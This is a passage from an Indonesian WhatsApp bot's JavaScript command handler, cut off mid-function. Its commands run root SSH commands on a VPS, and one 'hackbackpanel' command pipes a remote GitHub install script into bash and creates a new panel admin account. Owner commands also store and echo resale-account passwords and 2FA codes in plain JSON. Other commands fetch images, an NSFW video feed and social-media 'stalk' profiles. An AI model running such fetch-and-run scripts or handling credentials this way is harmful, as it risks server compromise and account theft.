//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("yubi|ipserver"))
if (!text.split("|")) return m.reply(example("yubi|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'addproduk': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik addproduk <code>|<nama>|<harga>|<deskripsi>\nContoh: addproduk SPO1B|Spotify Premium 1 Bulan|15000|Akses Spotify Premium selama 1 bulan');

    const [code, nama, hargaStr, deskripsi] = text.split('|').map(item => item.trim());
    if (!code || !nama || isNaN(hargaStr) || !deskripsi) {
        return m.reply('Format Salah!\nKetik addproduk <code>|<nama>|<harga>|<deskripsi>\nContoh: addproduk SPO1B|Spotify Premium 1 Bulan|15000|Akses Spotify Premium selama 1 bulan');
    }

    const harga = parseInt(hargaStr);
    if (harga <= 0) {
        return m.reply('Harga harus lebih besar dari 0.');
    }

    let produkList = [];
    try {
        const data = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data produk.');
    }

    
    const produkExist = produkList.find(produk => produk.id === code);
    if (produkExist) {
        return m.reply(`Produk dengan kode ${code} sudah ada.`);
    }

    
    const newProduk = {
        id: code,
        nama: nama,
        harga: harga,
        deskripsi: deskripsi,
        terjual: 0 
    };

    produkList.push(newProduk);

    try {
        fs.writeFileSync('source/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
        m.reply(`Produk berhasil ditambahkan:\n\n` +
                `Kode: ${code}\n` +
                `Nama: ${nama}\n` +
                `Harga: ${harga}\n` +
                `Deskripsi: ${deskripsi}`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat menambahkan produk.');
    }
}
break

case 'editproduk': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik editproduk <kode_produk>|<nama_baru>|<harga_baru>|<deskripsi_baru>\nContoh: editproduk SPO1B|Spotify Premium 1 Bulan Baru|20000|Akses Spotify Premium selama 1 bulan (Baru)');

    const [kodeProduk, namaBaru, hargaBaruStr, deskripsiBaru] = text.split('|').map(item => item.trim());
    if (!kodeProduk || !namaBaru || isNaN(hargaBaruStr) || !deskripsiBaru) {
        return m.reply('Format Salah!\nKetik editproduk <kode_produk>|<nama_baru>|<harga_baru>|<deskripsi_baru>\nContoh: editproduk SPO1B|Spotify Premium 1 Bulan Baru|20000|Akses Spotify Premium selama 1 bulan (Baru)');
    }

    const hargaBaru = parseInt(hargaBaruStr);
    if (hargaBaru <= 0) {
        return m.reply('Harga harus lebih besar dari 0.');
    }

    let produkList = [];
    try {
        const data = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data produk.');
    }

    const produkIndex = produkList.findIndex(produk => produk.id === kodeProduk);
    if (produkIndex === -1) {
        return m.reply(`Produk dengan kode ${kodeProduk} tidak ditemukan.`);
    }

    
    produkList[produkIndex].nama = namaBaru;
    produkList[produkIndex].harga = hargaBaru;
    produkList[produkIndex].deskripsi = deskripsiBaru;

    try {
        fs.writeFileSync('source/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
        m.reply(`Produk dengan kode ${kodeProduk} berhasil diperbarui:\n\n` +
                `➤ Nama Baru: ${namaBaru}\n` +
                `➤ Harga Baru: Rp ${hargaBaru.toLocaleString('id-ID')}\n` +
                `➤ Deskripsi Baru: ${deskripsiBaru}`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat memperbarui produk.');
    }
}
break

case 'addstock': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik addstock <kode_produk>|<email>:<password>:<profil>:<pin>:<a2f>\nContoh: addstock spo1b|user@example.com:password123:profilinfo:1234:a2fcode');

    const [idProduk, credentials] = text.split('|').map(item => item.trim());
    if (!idProduk || !credentials) {
        return m.reply('Format Salah!\nKetik addstock <kode_produk>|<email>:<password>:<profil>:<pin>:<a2f>\nContoh: addstock spo1b|user@example.com:password123:profilinfo:1234:a2fcode');
    }

    const [email, password, profil, pin, a2f] = credentials.split(':').map(item => item.trim());
    if (!email || !password || !profil || !a2f) {
        return m.reply('Format Salah!\nPastikan email, password, profil, dan a2f diisi.');
    }


    let produkList = [];
    try {
        const produkData = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(produkData);
    } catch (err) {
        console.error('Terjadi kesalahan saat membaca data produk:', err);
        return m.reply('❌ Terjadi kesalahan saat membaca data produk.');
    }


    const produkExist = produkList.find(produk => produk.id === idProduk);
    if (!produkExist) {
        return m.reply(`❌ Kode produk "${idProduk}" tidak ditemukan di produk.json.`);
    }

    const jsonFileName = `source/${idProduk}.json`;
    let stokData = [];

 
    if (fs.existsSync(jsonFileName)) {
        try {
            const data = fs.readFileSync(jsonFileName, 'utf8');
            stokData = JSON.parse(data);
        } catch (err) {
            console.error('Terjadi kesalahan saat membaca data stok:', err);
            return m.reply('❌ Terjadi kesalahan saat membaca data stok.');
        }
    }

  
    const newStock = {
        email: email,
        password: password,
        profil: profil,
        pin: pin || null, 
        a2f: a2f
    };

    stokData.push(newStock);

    try {
        fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
        m.reply(`✅ Stok berhasil ditambahkan ke produk ${idProduk}:\n\n` +
                `- Email: ${email}\n` +
                `- Password: ${password}\n` +
                `- Profil: ${profil}\n` +
                `- Pin: ${pin || 'Tidak diisi'}\n` +
                `- 2FA: ${a2f}`);
    } catch (err) {
        console.error('Terjadi kesalahan saat menulis data stok:', err);
        m.reply('❌ Terjadi kesalahan saat menambahkan stok.');
    }
}
break

case "cekgempa": {
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await conn.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break
                
                case "hentaivid": {
                 m.reply(mess.wait);
                  const anu = `https://api.agatz.xyz/api/hentaivid`; 
                  try { 
                  const res = await fetch(anu); 
                  const response = await res.json();
if (!response.data || response.data.length === 0) {
        return m.reply("Hasil tidak ditemukan");
    }
    
    for (let i = 0; i < Math.min(response.data.length, 10); i++) {
        const video = response.data[i];
        await conn.sendMessage(m.chat, {
            video: { url: video.video_1 },
            mimeType: 'video/mp4',
            caption: `Title: ${video.title}`
        }, { quoted: m });
    }
} catch (e) {
    console.log(e);
    await m.reply("Terjadi kesalahan dalam mengambil data.");
}
}
 break

case 'editstock': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik editstock <kode_produk>|<email>|<password>:<profil>:<pin>:<a2f>\nContoh: editstock spo1b|user@example.com|newpassword:newprofil:4321:newa2f');

    const [idProduk, email, credentials] = text.split('|').map(item => item.trim());
    if (!idProduk || !email || !credentials) {
        return m.reply('Format Salah!\nKetik editstock <kode_produk>|<email>|<password>:<profil>:<pin>:<a2f>\nContoh: editstock spo1b|user@example.com|newpassword:newprofil:4321:newa2f');
    }

    const [password, profil, pin, a2f] = credentials.split(':').map(item => item.trim());
    if (!password || !profil || !a2f) {
        return m.reply('Format Salah!\nPastikan password, profil, dan a2f diisi.');
    }

    const jsonFileName = `source/${idProduk}.json`;
    let stokData = [];

    try {
        const data = fs.readFileSync(jsonFileName, 'utf8');
        stokData = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data stok.');
    }

    const stokIndex = stokData.findIndex(stock => stock.email === email);
    if (stokIndex === -1) {
        return m.reply(`Stok dengan email ${email} tidak ditemukan.`);
    }

  
    stokData[stokIndex].password = password;
    stokData[stokIndex].profil = profil;
    stokData[stokIndex].pin = pin || null; 
    stokData[stokIndex].a2f = a2f;

    try {
        fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
        m.reply(`Stok dengan email ${email} berhasil diperbarui:\n\n` +
                `- Email: ${email}\n` +
                `- Password: ${password}\n` +
                `- Profil: ${profil}\n` +
                `- Pin: ${pin || 'Tidak diisi'}\n` +
                `- 2FA: ${a2f}`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat memperbarui stok.');
    }
}
break

case "asupan": case "cosplay": {
  m.reply(mess.wait);
  const axios = require('axios');
  let anu = `https://archive-ui.tanakadomp.biz.id/asupan/cosplay`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' });
  try {
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Done Boss'
    }, {quoted: m})
  } catch (e) {
     console.log(e)
}
}
break

case "anime": {
  m.reply(mess.wait);
  const axios = require('axios');
  let anu = `https://archive-ui.tanakadomp.biz.id/asupan/anime`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' });
  try {
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Done Boss'
    }, {quoted: m})
  } catch (e) {
     console.log(e)
}
}
break

case 'delproduk': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik delproduk <kode_produk>\nContoh: delproduk SPO1B');

    const kodeProduk = text.trim();
    if (!kodeProduk) {
        return m.reply('Format Salah!\nKetik delproduk <kode_produk>\nContoh: delproduk SPO1B');
    }

    let produkList = [];
    try {
        const data = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data produk.');
    }

    const produkIndex = produkList.findIndex(produk => produk.id === kodeProduk);
    if (produkIndex === -1) {
        return m.reply(`Produk dengan kode ${kodeProduk} tidak ditemukan.`);
    }

   
    const deletedProduk = produkList.splice(produkIndex, 1)[0];

    try {
        fs.writeFileSync('source/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat menyimpan data produk.');
    }

    
    const stokFilePath = `source/${kodeProduk}.json`;
    try {
        if (fs.existsSync(stokFilePath)) {
            fs.unlinkSync(stokFilePath);
        }
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat menghapus file stok.');
    }

    m.reply(`Produk dengan kode ${kodeProduk} berhasil dihapus:\n\n` +
            `➤ Nama: ${deletedProduk.nama}\n` +
            `➤ Harga: Rp ${deletedProduk.harga.toLocaleString('id-ID')}\n` +
            `➤ Deskripsi: ${deletedProduk.deskripsi}`);
}
break

case "carbonify": {
                    if(!text) return m.reply("_Masukan Teks..._");
                    m.reply("Mohon Tunggu Sebentar. . .")
                    const axios = require('axios');
                    let url = `https://api.siputzx.my.id/api/m/carbonify?input=${encodeURIComponent(text)}`;
                    const response = await axios.get(url, { responseType: 'arraybuffer' });
                    try {
                        conn.sendMessage(m.chat, {
                            image: Buffer.from(response.data),
                            caption: '_Done Icikbos..._'
                        }, { quoted: m })
                    } catch (e) {
                        console.log(e)
                        await m.reply("Maaf, Error")
                    }
                }
                break

case "blackbox":
case "bb": {
    let prompt = text ? text : (m.quoted ? m.quoted.text : null);
    if(!prompt) return m.reply("Halo, Mau Bertanya Apa?");
    
    await m.reply(mess.wait);
    let anu = `https://api.siputzx.my.id/api/ai/blackboxai?content=${encodeURIComponent(prompt)}`;
    let res = await fetch(anu)
    let response = await res.json(); 
    let teks = `${response.data}`
    try {
        conn.sendMessage(m.chat, {text: teks}, {quoted: m})
    } catch (e) {
        console.log(e)
        await m.reply("Error")
    }
}
break

case "kucing":
                case "cat": case "randomkucing": {
                await m.reply(mess.wait);
                try {
                const axios = require('axios');
                    //Mengambil Data Dari Api
                    let anu = `https://api.siputzx.my.id/api/r/cats`
                    const response = await axios.get(anu, { responseType: 'arraybuffer' });
                    //Mengambil Gambar
                    conn.sendMessage(m.chat,
                        {
                            image: Buffer.from(response.data),
                            caption: "Berhasil Mengambil"
                        }, { quoted: m })
                } catch (e) {
                    //Untuk Menampilkan Error Di Terminal
                    console.log(e)
                    //Untuk Reply Pesan Kalo Ada Error 
                    await m.reply("Error")
                }
            }
                break
                
                case "cecan": case "cn": {
    await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
    const apiEndpoints = {
        "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
        "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
        "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
        "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
        "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
        "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
    }
    try {
    const axios = require('axios');
        let araara = new Array()
        const imagesPerCountry = 3
        for (const [country, url] of Object.entries(apiEndpoints)) {
            for (let i = 0; i < imagesPerCountry; i++) {
                try {
                    const response = await axios.get(url, { responseType: 'arraybuffer' })
                    let imgsc = await prepareWAMessageMedia(
                        { image: Buffer.from(response.data) }, 
                        { upload: conn.waUploadToServer }
                    )
                    araara.push({
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            hasMediaAttachment: true,
                            ...imgsc
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{                  
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
                            }]
                        })
                    })
                    await new Promise(resolve => setTimeout(resolve, 500))
                    
                } catch (error) {
                    console.error(`Error processing image ${i + 1} for ${country}:`, error)
                    continue
                }
            }
        }
        if (araara.length === 0) {
            throw new Error('No valid images found')
        }
        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n\nSetiap negara menampilkan 3 gambar terbaik~`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: araara
                        })
                    })
                }
            }
        }, {userJid: m.sender, quoted: m})

        await conn.relayMessage(m.chat, msgii.message, { 
            messageId: msgii.key.id 
        })
        await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
    } catch (error) {
        console.error('Error:', error)
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
        return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
    }
}
break

case "wikipedia":
case "wiki": {
  if (!text) return m.reply(`Example: ${prefix + command} query`);
  try {
    let api = await fetch(`https://api.siputzx.my.id/api/s/wikipedia?query=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (!data.data) return m.reply('No results found! Try searching on a search engine for more information.');
    
    let caption = `乂 *WIKIPEDIA* ◦\n\n`;
    caption += data.data.wiki;
    await conn.sendMessage(m.chat, { image: { url: data.data.thumb }, caption: caption });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "tiktoksearch":
case "stiktok": {
  if (!text) return m.reply(`Example: ${prefix + command} query`);
  try {
    let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/search/tiktoksearch?q=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (data.result.length === 0) return m.reply('No videos found!');

    
    let hasil = data.result.slice(0, 15);
    for (let i = 0; i < hasil.length; i++) {
      let video = hasil[i];
      let caption = `乂 *VIDEO ${i + 1}* ◦\n\n`;
      caption += `乂 *Title* : ${video.title}\n`;
      caption += `乂 *Author* : ${video.author.nickname}\n`;
      caption += `乂 *Duration* : ${video.duration}s\n`;
      caption += `乂 *Statistics* : - Views: ${video.play_count.toLocaleString()} - Likes: ${video.digg_count.toLocaleString()} - Comments: ${video.comment_count.toLocaleString()} - Shares: ${video.share_count.toLocaleString()} - Downloads: ${video.download_count.toLocaleString()}`;
      
      await conn.sendMessage(m.chat, { video: { url: video.play }, caption: caption });
    }
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "tts": case "texttosound": {
  if (!text) {
    return m.reply(
      `Masukkan teks yang ingin diubah menjadi suara!\n\nContoh: tts <teks> <bahasa>\n\nList Bahasa:\n id - Bahasa Indonesia\n en - English\n es - Español\n fr - Français\n de - Deutsch\n zh-CN - 中文\n ja - 日本語\n ko - 한국어\n ar - العربية\n ru - Русский\n pt - Português\n it - Italiano\n nl - Nederlands\n sv - Svenska\n da - Dansk\n no - Norsk\n he - עברית\n hi - हिन्दी\n ur - اردو\n bn - বাংলা\n tr - Türkçe`
    );
  }

  const args = text.split(' ');
  if (args.length < 2) {
    return m.reply('Format salah! Masukkan bahasa dan teks.\n\nContoh: tts id Selamat pagi!');
  }

  const bahasa = args[0];
  const teks = args.slice(1).join(' ');

  const listBahasa = {
    "id": "Bahasa Indonesia",
    "en": "English",
    "es": "Español",
    "fr": "Français",
    "de": "Deutsch",
    "zh-CN": "中文",
    "ja": "日本語",
    "ko": "한국어",
    "ar": "العربية",
    "ru": "Русский",
    "pt": "Português",
    "it": "Italiano",
    "nl": "Nederlands",
    "sv": "Svenska",
    "da": "Dansk",
    "no": "Norsk",
    "he": "עברית",
    "hi": "हिन्दी",
    "ur": "اردو",
    "bn": "বাংলা",
    "tr": "Türkçe"
  };

  if (!listBahasa[bahasa]) {
    return m.reply(`Bahasa tidak didukung! Pilih salah satu dari:\n${Object.keys(listBahasa).join(', ')}`);
  }

  try {
    const apiUrl = `https://fastrestapis.fasturl.cloud/tts/google?text=${encodeURIComponent(teks)}&target=${bahasa}`;
    const response = await fetch(apiUrl);

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const buffer = await response.buffer();
    await conn.sendMessage(
      m.chat,
      { audio: buffer, mimetype: 'audio/mpeg', caption: `Suara dalam ${listBahasa[bahasa]}` },
      { quoted: m }
    );
  } catch (error) {
    console.error('Error in TTS:', error);
    m.reply('Terjadi kesalahan saat mengubah teks menjadi suara.');
  }
  }
  break

              case "tiktokstalk": case "ttstalk": {
    if (!text) return m.reply(`Example: ${prefix + command} username`);
    try {
        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);
        let data = await api.json();
        if (!data.status) return m.reply('User not found!');
        let caption = `乂 *TIKTOK STALK*

◦ *Name* : ${data.result.nama}
◦ *Username* : ${data.result.user}
◦ *Bio* : ${data.result.bio}
◦ *Followers* : ${data.result.followers}
◦ *Following* : ${data.result.following}
◦ *Private* : ${data.result.privatemode ? 'Yes' : 'No'}`;
        await conn.sendMessage(m.chat, { 
            image: { url: data.result.profile },
            caption: caption 
        });
    } catch (e) {
        console.log(e);
        m.reply('Error occurred while fetching data!');
    }
}
break

case "ytstalk":
case "youtubestalk": {
    if (!text) return m.reply("Enter a YouTube username!")
    try {
        let searchResults = []
        let maxResults = 5 
        for (let i = 0; i < maxResults; i++) {
            try {
                let searchTerm = i === 0 ? text : `${text}${i}`
                let res = await fetch(`https://fastrestapis.fasturl.cloud/stalk/youtube/simple?username=${searchTerm}`)
                if (!res.ok) continue
                
                let json = await res.json()
                if (json?.status === 200 && json?.result) {
                    searchResults.push(json.result)
                }
            } catch (err) {
                continue
            }
        }

        if (!searchResults || searchResults.length === 0) return m.reply('No YouTube channels found!')

        let fullResponse = `🎥 *Found ${searchResults.length} YouTube Channels*\n\n`

        for (let idx = 0; idx < searchResults.length; idx++) {
            let result = searchResults[idx]
            if (!result) continue

            let additionalInfo = result.additionalInfo || {}
            let latestVideos = result.latestVideos || []
            
            fullResponse += `*Channel ${idx + 1}*\n` +
                `📛 *Channel Name:* ${result.channel || 'N/A'}\n` +
                `📝 *Description:* ${result.description || 'No description'}\n` +
                `🔗 *Channel URL:* ${result.url || 'N/A'}\n` +
                `📊 *Statistics:*\n` +
                `   • Subscribers: ${additionalInfo.totalSubs || '0'}\n` +
                `   • Total Videos: ${additionalInfo.totalVideos || '0'}\n` +
                `   • Total Views: ${additionalInfo.views || '0'}\n` +
                `📅 *Joined:* ${additionalInfo.join || 'N/A'}\n\n`

            if (latestVideos.length > 0) {
                fullResponse += `🎬 *Latest 2 Videos:*\n`
                
                for (let i = 0; i < 2 && i < latestVideos.length; i++) {
                    let video = latestVideos[i]
                    if (!video) continue
                    
                    fullResponse += `${i + 1}. ${video.title || 'N/A'}\n` +
                        `   • Views: ${video.views || '0'}\n` +
                        `   • Link: ${video.videoUrl || 'N/A'}\n\n`
                }
            }


            if (result.socialMediaLinks && Array.isArray(result.socialMediaLinks) && result.socialMediaLinks.length > 0) {
                fullResponse += `🔗 *Social Media Links:*\n`
                result.socialMediaLinks.forEach((link, i) => {
                    if (link && link.url) {
                        fullResponse += `${i + 1}. ${link.url}\n`
                    }
                })
            }

            fullResponse += `\n${"=".repeat(40)}\n\n`
        }

        await m.reply(fullResponse)
    } catch (e) {
        console.error(e)
        return m.reply('Error occurred while fetching YouTube info!')
    }
    }
    break

case "ytstalk2":
case "youtubestalk2": {
  if (!text) return m.reply(`Example: ${prefix + command} username`);
  try {
    let api = await fetch(`https://api.siputzx.my.id/api/stalk/youtube?username=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (!data.data) return m.reply('No results found! Try searching on a search engine for more information.');
    
    let caption = `乂 *YOUTUBE STALK* ◦\n\n`;
    caption += `乂 *Username* : ${data.data.channel.username}\n`;
    caption += `乂 *Subscriber Count* : ${data.data.channel.subscriberCount}\n`;
    caption += `乂 *Video Count* : ${data.data.channel.videoCount}\n`;
    caption += `乂 *Avatar Url* : ${data.data.channel.avatarUrl}\n`;
    caption += `乂 *Channel Url* : ${data.data.channel.channelUrl}\n`;
    caption += `乂 *Description* : ${data.data.channel.description}\n\n`;
    
    await conn.sendMessage(m.chat, { image: { url: data.data.channel.avatarUrl }, caption: caption });
    
    let latestVideos = data.data.latest_videos;
    for (let i = 0; i < latestVideos.length; i++) {
      let video = latestVideos[i];
      let videoCaption = `乂 *VIDEO ${i + 1}* ◦\n\n`;
      videoCaption += `乂 *Title* : ${video.title}\n`;
      videoCaption += `乂 *Video ID* : ${video.videoId}\n`;
      videoCaption += `乂 *Published Time* : ${video.publishedTime}\n`;
      videoCaption += `乂 *View Count* : ${video.viewCount}\n`;
      videoCaption += `乂 *Duration* : ${video.duration}\n`;
      videoCaption += `乂 *Video Url* : ${video.videoUrl}\n\n`;
      
      await conn.sendMessage(m.chat, { image: { url: video.thumbnail }, caption: videoCaption });
      await conn.sendMessage(m.chat, { video: { url: video.videoUrl }, caption: `Here's your video!` });
    }
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

                case "epep":
case "ff":
case "ffstalk":{
 try {
 if (args.length === 0) return m.reply(`Example: ${prefix + command} 537212033`);
 
 const id = args[0];
 const apiUrl = `https://vapis.my.id/api/ff-stalk?id=${id}`;
 
 const response = await fetch(apiUrl);
 const json = await response.json();
 
 if (!json.status) return m.reply('Failed to fetch data. User ID might be invalid.');
 
 const data = json.data;
 const account = data.account;
 const pet = data.pet_info;
 const guild = data.guild;
 const items = data.equippedItems;
 
 let text = `*👤 FREE FIRE USER INFO*\n\n`;
 text += `*🆔 User ID*: ${account.id}\n`;
 text += `*👤 Username*: ${account.name}\n`;
 text += `*🔰 Level*: ${account.level}\n`;
 text += `*⭐ XP*: ${account.xp}\n`;
 text += `*🌍 Region*: ${account.region}\n`;
 text += `*👍 Likes*: ${account.like}\n`;
 text += `*📝 Bio*: ${account.bio}\n`;
 text += `*🎂 Created*: ${account.create_time}\n`;
 text += `*⏱️ Last Login*: ${account.last_login}\n`;
 text += `*🎖️ Honor Score*: ${account.honor_score}\n`;
 text += `*🎯 BR Points*: ${account.BR_points}\n`;
 text += `*🔫 CS Points*: ${account.CS_points}\n`;
 text += `*🎫 Booyah Pass*: ${account.booyah_pass ? 'Yes' : 'No'}\n`;
 text += `*🏆 Booyah Pass Badge*: ${account.booyah_pass_badge}\n\n`;
 
 if (pet) {
 text += `*🐱 PET INFO*\n`;
 text += `*🐾 Name*: ${pet.name}\n`;
 text += `*🔰 Level*: ${pet.level}\n`;
 text += `*⭐ XP*: ${pet.xp}\n\n`;
 }
 
 if (guild) {
 text += `*👥 GUILD INFO*\n`;
 text += `*🛡️ Name*: ${guild.name}\n`;
 text += `*🆔 ID*: ${guild.id}\n`;
 text += `*🔰 Level*: ${guild.level}\n`;
 text += `*👥 Members*: ${guild.member}/${guild.capacity}\n\n`;
 }
 

 text += `*🎮 EQUIPPED ITEMS*\n`;
 
 if (items.Outfit && items.Outfit.length > 0) {
 text += `\n*👕 Outfit*:\n`;
 items.Outfit.forEach(item => {
 text += `- ${item.name}\n`;
 });
 }
 
 if (items.Pet && items.Pet.length > 0) {
 text += `\n*🐾 Pet*:\n`;
 items.Pet.forEach(item => {
 text += `- ${item.name}\n`;
 });
 }
 
 if (items.Avatar && items.Avatar.length > 0) {
 text += `\n*🎭 Avatar*:\n`;
 items.Avatar.forEach(item => {
 text += `- ${item.name}\n`;
 });
 }
 
 if (items.Banner && items.Banner.length > 0) {
 text += `\n*🏳️ Banner*:\n`;
 items.Banner.forEach(item => {
